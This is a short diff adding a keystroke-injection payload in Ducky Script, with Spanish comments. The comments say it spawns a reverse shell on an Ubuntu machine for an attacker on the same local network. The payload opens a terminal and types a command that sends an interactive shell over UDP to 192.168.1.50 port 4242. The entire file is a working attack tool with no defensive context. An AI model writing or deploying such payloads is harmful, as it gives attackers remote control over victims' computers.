@@ -1,0 +1,13 @@
+REM  Este payload crea una reverse shell
+REM  en un sistema GNU/Linux ( probado en Ubuntu )
+REM  donde el atacante se encuentra en su misma red local.
+
+REM Abre la terminal
+CTRL ALT t
+DELAY 1000
+
+REM Arranca la reverse shell
+STRING sh -i >&/dev/udp/192.168.1.50/4242 0>&1
+DELAY 80
+ENTER
+DELAY 170
